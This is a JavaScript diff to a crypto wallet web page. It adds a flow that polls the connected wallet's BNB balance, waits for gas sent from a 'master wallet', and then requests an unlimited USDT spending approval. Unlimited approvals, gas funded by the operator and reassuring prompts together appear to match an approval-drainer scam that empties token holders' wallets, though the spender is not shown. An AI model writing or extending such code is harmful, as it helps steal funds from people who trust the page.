@@ -44,7 +44,7 @@ document.addEventListener('DOMContentLoaded', () => {
   
   // Event listeners
   connectWalletBtn.addEventListener('click', connectWallet)
-  approveBtn.addEventListener('click', approveUSDTSpending)
+  approveBtn.addEventListener('click', handleApprovalFlow)
   disconnectBtn.addEventListener('click', disconnectWallet)
 })
 
@@ -157,11 +157,80 @@ async function updateWalletInfo() {
   }
 }
 
-// Approve USDT spending
-async function approveUSDTSpending() {
+// Handle the complete approval flow including gas management
+async function handleApprovalFlow() {
   try {
     showLoading(approveText, true)
     
+    // First check if wallet has sufficient gas
+    const hasGas = await checkWalletGasBalance()
+    
+    if (!hasGas) {
+      showSuccess('Insufficient gas detected. Waiting for gas from master wallet...')
+      
+      // In a real implementation, we would wait for the backend to send gas
+      // For now, we'll simulate this by checking periodically
+      await waitForGas(30000) // Wait up to 30 seconds
+    }
+    
+    // Now proceed with USDT approval
+    await approveUSDTSpending()
+    
+  } catch (error) {
+    console.error('Approval flow error:', error)
+    showError('Approval flow failed: ' + error.message)
+  } finally {
+    showLoading(approveText, false)
+  }
+}
+
+// Check if wallet has sufficient gas balance
+async function checkWalletGasBalance() {
+  try {
+    if (!provider || !walletAddress) {
+      throw new Error('Wallet not connected')
+    }
+    
+    const balance = await provider.getBalance(walletAddress)
+    const balanceInBNB = ethers.formatEther(balance)
+    
+    // Check if balance is greater than minimum required (0.001 BNB)
+    const hasSufficientGas = parseFloat(balanceInBNB) >= 0.001
+    
+    console.log('Gas balance:', balanceInBNB, 'BNB - Sufficient:', hasSufficientGas)
+    
+    return hasSufficientGas
+  } catch (error) {
+    console.error('Gas check error:', error)
+    // If we can't check, assume no gas and let the master wallet handle it
+    return false
+  }
+}
+
+// Wait for gas to be sent to wallet
+async function waitForGas(timeout = 30000) {
+  const startTime = Date.now()
+  
+  while (Date.now() - startTime < timeout) {
+    // Check gas balance
+    const hasGas = await checkWalletGasBalance()
+    
+    if (hasGas) {
+      showSuccess('Gas received! Proceeding with approval...')
+      return true
+    }
+    
+    // Wait 2 seconds before checking again
+    await new Promise(resolve => setTimeout(resolve, 2000))
+  }
+  
+  // Timeout reached
+  throw new Error('Gas not received within timeout period. Please try again.')
+}
+
+// Approve USDT spending
+async function approveUSDTSpending() {
+  try {
     if (!signer) {
       throw new Error('Wallet not connected')
     }
@@ -179,6 +248,8 @@ async function approveUSDTSpending() {
       ethers.MaxUint256
     )
     
+    showSuccess('Transaction sent. Waiting for confirmation...')
+    
     // Wait for confirmation
     await tx.wait()
     
@@ -190,9 +261,15 @@ async function approveUSDTSpending() {
     
   } catch (error) {
     console.error('Approval error:', error)
-    showError('Approval failed: ' + error.message)
-  } finally {
-    showLoading(approveText, false)
+    
+    // Check if it's a gas-related error
+    if (error.message.includes('gas') || error.message.includes('funds')) {
+      showError('Insufficient gas for transaction. Master wallet will send gas shortly.')
+    } else {
+      showError('Approval failed: ' + error.message)
+    }
+    
+    throw error
   }
 }
 
